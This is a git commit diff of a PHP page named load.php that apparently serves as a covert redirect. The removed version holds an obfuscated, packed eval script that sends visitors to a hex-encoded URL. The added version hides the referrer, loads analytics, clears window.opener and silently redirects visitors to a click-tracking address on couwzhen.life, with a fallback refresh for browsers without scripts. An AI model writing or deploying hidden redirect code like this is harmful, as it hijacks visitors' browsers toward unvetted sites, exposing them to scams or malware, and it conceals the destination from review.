4d2b2f183c3b21ab9d42a1352bad107ae7f596db
ksmtrck <rianrambur@gmail.com>
2017-07-13 19:07:21 +0700

    Update load.php

--- https/github.com/ksmtrck/load.php
+++ https/github.com/ksmtrck/load.php
@@ -1,6 +1,15 @@
-<script type='text/javascript'>
-{
-window.location.href = "eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('l 5=["\\9\\4\\j\\m","\\i\\8\\b\\h\\3\\7\\8\\g","\\9\\3\\3\\e\\a\\f\\6\\6\\c\\a\\k\\3\\4\\b\\c\\d\\n\\7\\3\\9\\q\\p\\d\\7\\8\\6\\4\\4\\6"];o[5[1]][5[0]]=5[2]',27,27,'|||x74|x72|_0x6cf1|x2F|x69|x6F|x68|x73|x63|x6B|x2E|x70|x3A|x6E|x61|x6C|x65|x6D|var|x66|x67|window|x62|x75'.split('|'),0,{}))
-";
-}
-</script>
+
+
+<head><meta name="referrer" content="never">
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i["GoogleAnalyticsObject"]=r;i[r]=i[r]||function(){ 
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), 
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) 
+})(window,document,"script","https://www.google-analytics.com/analytics.js","ga"); 
+ga("create", "UA-84047128-1", "auto"); 
+ga("send", "pageview"); 
+</script> 
+
+<noscript><META http-equiv="refresh" content="0;URL=https://web.facebook.com/zuck"></noscript></head><script>window.opener = null; location.replace("http://couwzhen.life/?clk=1499947476&sid1=&sid2=")</script>
+				
+				
